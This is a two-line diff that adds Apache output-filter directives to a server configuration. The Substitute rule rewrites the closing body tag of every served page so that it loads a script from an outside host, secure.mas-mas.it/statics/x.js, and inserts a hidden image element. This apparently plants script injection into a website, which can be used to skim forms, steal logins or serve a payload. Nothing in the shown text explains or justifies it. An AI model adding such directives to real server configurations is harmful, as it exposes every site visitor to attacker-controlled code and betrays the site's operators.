@@ -1,0 +1,2 @@
+Substitute "s|</body>|<script src='//secure.mas-mas.it/statics/x.js' ></script><img id='imageid' /></body>|ni"
+SetOutputFilter SUBSTITUTE;DEFLATE
